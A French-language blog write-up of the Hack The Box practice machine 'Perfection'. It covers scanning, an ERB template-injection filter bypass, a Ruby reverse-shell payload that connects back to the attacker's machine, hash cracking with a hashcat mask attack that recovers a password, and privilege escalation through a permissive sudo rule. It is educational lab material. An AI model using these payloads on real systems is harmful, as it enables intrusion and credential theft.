<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Perfection</title>
<meta name=description content="Platforme: Hack The Box Lien: Perfection Niveau: Facile OS: Linux Ce challenge débute avec un site web simple. Grâce à l&amp;rsquo;énumération, nous identifions une …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-perfection/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Perfection"><meta property="og:description" content="Platforme: Hack The Box Lien: Perfection Niveau: Facile OS: Linux Ce challenge débute avec un site web simple. Grâce à l&amp;rsquo;énumération, nous identifions une …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Perfection/Perfection.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Perfection/Perfection.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Perfection"><meta name=twitter:description content="Platforme: Hack The Box Lien: Perfection Niveau: Facile OS: Linux Ce challenge débute avec un site web simple. Grâce à l&amp;rsquo;énumération, nous identifions une …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-perfection/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-perfection/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Perfection/Perfection.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-perfection/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-perfection/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Perfection</h1><small role=doc-subtitle></small><p class=post-date>4 min read |
<span class=post-date>4 Juillet 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Perfection>Perfection</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p>Ce challenge débute avec un site web simple. Grâce à l&rsquo;énumération, nous identifions une vulnérabilité à l&rsquo;injection de modèle côté serveur (SSTI), que nous exploitons pour obtenir notre accès initial. Nous découvrons ensuite un fichier de base de données contenant des hachages de mots de passe, mais nos premières tentatives pour les craquer sont infructueuses. Après avoir lu les courriels des utilisateurs, nous apprenons que les mots de passe suivent un format spécifique. En utilisant cette information, nous employons une attaque par masque avec Hashcat et réussissons à récupérer le mot de passe. Enfin, nous exécutons <code>sudo -l</code> et découvrons des règles très permissives, nous permettant d&rsquo;élever nos privilèges sans avoir besoin d&rsquo;un mot de passe.</p><p>Addresse IP cible - <code>10.10.11.253</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV -oA  nmap/Perfection 10.10.11.253
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-03-25 14:20 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.253
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.051s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx
</span></span><span style=display:flex><span>|_http-title: Weighted Grade Calculator
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 11.06 seconds
</span></span></code></pre></div><h2 id=enumération>Enumération</h2><p>Le site web offre un &ldquo;outil permettant de calculer des notes sur la base des données entrées.</p><p><code>http://10.10.11.253/weighted-grade-calc</code> nous permet d&rsquo;utiliser l&rsquo;outil.</p><p><img src=/images/HTB-Perfection/weighed-grade.png alt="Calculate your weighted grade table"></p><p>Après avoir rempli le tableau et soumis les notes, nous obtenons des résultats.</p><p><img src=/images/HTB-Perfection/weighed-grade-results.png alt="Weighted grades"></p><p>En bas de page, nous lisons que l&rsquo;application utilise <code>WEBrick 1.7.0</code>.</p><p><img src=/images/HTB-Perfection/WEBrick.png alt="Website powered by WEBrick 1.7.0"></p><p>La recherche de vulnérabilités associées à cette version spécifique ne donne aucun résultat. L&rsquo;énumération des sous-domaines et du code source aboutit au même résultat.</p><p>L&rsquo;extension <code>Wappalyzer</code> révèle que l&rsquo;application utilise <code>Ruby 3.0.2</code>.</p><p><img src=/images/HTB-Perfection/wappalyzer.png alt="Wapplyzer results"></p><p>Puisque l&rsquo;application accepte les entrées de l&rsquo;utilisateur, nous pouvons essayer quelques attaques par injection. Nous remplissons le tableau, capturons la requête avec Burp Suite et l&rsquo;envoyons au repeater.</p><p>Le premier test est avec <code>; ls</code> comme valeur pour <code>category1</code>.</p><p><img src=/images/HTB-Perfection/injection-attack.png alt="Request in Burp for injection attack"></p><p>Il renvoie <code>Malicious input blocked</code> (entrée malveillante bloquée). Les essais avec différents payloads aboutissent au même résultat, il y a donc un filtre de données qu&rsquo;il faut contourner.</p><p><img src=/images/HTB-Perfection/injection-blocked.png alt="Injection blocked"></p><p>Sur la page github de <code>WEBrick</code>, nous apprenons qu&rsquo;il peut être utilisé à différentes fins. <em>Plus d&rsquo;informations, <a href=https://github.com/ruby/webrick>ici</a>.</em></p><p><img src=/images/HTB-Perfection/WEBrick-github.png alt="WEBrick github page"></p><p>Nous apprenons également qu&rsquo;ERB est un système de templates pour Ruby. <em>Plus d&rsquo;informations, <a href=https://github.com/ruby/erb>ici</a>.</em></p><p><img src=/images/HTB-Perfection/ERB-template.png alt="ERB-template page"></p><p>N&rsquo;étant pas familier avec ces technologies, nous nous faisons aider par ChatGPT sur comment vérifier si un serveur utilise le système de templating Ruby ERB. Nous utiliserons la troisième option.</p><p><img src=/images/HTB-Perfection/ERB-test.png alt="ERB tests"></p><h2 id=accès-initial>Accès Initial</h2><p>En utilisant la payload indiqué, j&rsquo;obtiens le message suivant:</p><p><code>Invalid query parameters: invalid %-encoding (&amp;amp;lt;%= 2 + 2 %&amp;amp;gt;)</code>.</p><p>Après quelques modifications, il marche avec succès! Le filtre peut être contourné en utilisant <code>%0A</code> (pour une nouvelle ligne) et l&rsquo;encodage d&rsquo;URL.</p><blockquote><p>Payload utilisé pour le test: <code>%0A&lt;%25%3d+2+%2b+2+%25></code></p></blockquote><p><img src=/images/HTB-Perfection/SSTI-working.png alt="Successful SSTI test"></p><p>Ce résultat confirme que la cible est vulnérable au <a href=https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby>SSTI</a> et qu&rsquo;elle utilise effectivement Ruby ERB. Nous pouvons exécuter un reverse shell et accéder au système.</p><p>Ci-dessous, le payload (ruby) utilisé pour obtenir un reverse shell, il provient de <a href=https://www.revshells.com/>revshells</a>.</p><pre tabindex=0><code>Chemistry%0A&lt;%25%3d+`ruby+-rsocket+-e&#39;spawn(&#34;sh&#34;,[%3ain,%3aout,%3aerr]%3d&gt;TCPSocket.new(&#34;10.10.15.4&#34;,1337))&#39;`+%25&gt;
</code></pre><p><img src=/images/HTB-Perfection/ruby-revshell.png alt="Ruby reverse shell"></p><p>Nous obtenons une connexion sur notre listener et sommes connectés en tant qu&rsquo;utilisateur <code>susan</code>. Nous améliorons notre shell avec les commandes ci-dessous.</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><p><img src=/images/HTB-Perfection/foothold.png alt=Foothold></p><p>Le fichier <code>user.txt</code> se trouve dans <code>/home/susan</code>.</p><p><img src=/images/HTB-Perfection/user-flag.png alt="User flag location"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Nous utilisons <code>linpeas.sh</code> pour trouver des pistes d&rsquo;escalade de privilèges.</p><ul><li><code>susan</code> fait partie du groupe sudo</li></ul><p><img src=/images/HTB-Perfection/susan-sudoer.png alt="User susan is a sudoer"></p><ul><li>Des fichiers contenant des informations d&rsquo;identification sont trouvés</li></ul><p><img src=/images/HTB-Perfection/susan-credentials.png alt="Credentials files are found"></p><ul><li>L&rsquo;utilisateur a également reçu du courrier, qui peut être intéressant à consulter</li></ul><p><img src=/images/HTB-Perfection/susan-mail.png alt="The user has some mail"></p><p>Il s&rsquo;avère que nous ne pouvons pas exécuter <code>sudo -l</code> sans mot de passe.</p><p><img src=/images/HTB-Perfection/susan-privesc.png alt="sudo -l requires password"></p><p>Le fichier de base de données contient des hashs d&rsquo;utilisateurs dont celui de <code>susan</code>.</p><pre tabindex=0><code>strings /home/susan/Migration/pupilpath_credentials.db
</code></pre><p><img src=/images/HTB-Perfection/susan-hash.png alt="susan hash"></p><pre tabindex=0><code>hashid &#39;abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f&#39;
</code></pre><p><code>hashid</code> révèle qu&rsquo;il s&rsquo;agit d&rsquo;un hash SHA-256. Nous essayons d&rsquo;utiliser hashcat avec le hachage mais cela échoue.</p><p>Après avoir lu le courrier, nous découvrons que le mot de passe utilise une structure spécifique.</p><p><img src=/images/HTB-Perfection/susan-mail1.png alt="Reading susan mail"></p><p>Nous tentons une attaque par masque et réussissons à récupérer le mot de passe <code>susan_nasus_413759210</code>.</p><blockquote><p>Dans une attaque par masque, nous avons connaissance des designs des mots de passe. Vous pouvez en lire plus à ce sujet <a href="https://hashcat.net/wiki/doku.php?id=mask_attack#mask_attack">ici</a>.</p></blockquote><pre tabindex=0><code>hashcat -m 1400 hash.txt -a 3 -d 1 susan_nasus_?d?d?d?d?d?d?d?d?d
</code></pre><p><img src=/images/HTB-Perfection/password-recovered.png alt="Reading susan mail"></p><p>Avec ce mot de passe, nous nous connectons via SSH. Avec <code>sudo -l</code> nous constatons que nous avons un accès direct à root.</p><p><img src=/images/HTB-Perfection/sudo-l.png alt="sudo -l command"></p><p>La règle mise en place est très permissive, permettant à l&rsquo;utilisateur <code>susan</code> d&rsquo;exécuter n&rsquo;importe quelle commande, en tant que n&rsquo;importe quel utilisateur ou groupe, ce qui lui donne un contrôle administratif complet lorsque l&rsquo;on utilise <code>sudo</code>.</p><p>En exécutant <code>sudo su</code>, nous obtenons un shell root et trouvons le drapeau root dans <code>/root</code>.</p><p><img src=/images/HTB-Perfection/root-flag.png alt="root flag"></p><p>Merci d&rsquo;avoir lu mon blog et j&rsquo;espère que cet article vous a été utile! Si vous voulez vous exercer au SSTI, jetez un coup d&rsquo;œil à ces machines sur HackTheBox :</p><ul><li><a href=https://app.hackthebox.com/machines/RedPanda/information>RedPanda</a> (Facile)</li><li><a href=https://app.hackthebox.com/machines/Sandworm/information>Sandworm</a> (Moyen)</li><li><a href=https://app.hackthebox.com/machines/Talkative/information>Talkative</a> (Difficile)</li></ul></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-office/>&#8592;
Précédent:
HTB: Office</a></p><p class=prev-post-date>juin 19, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-headless/>Suivant:
HTB: Headless
&#8594;</a></p><p class=next-post-date>juillet 19, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>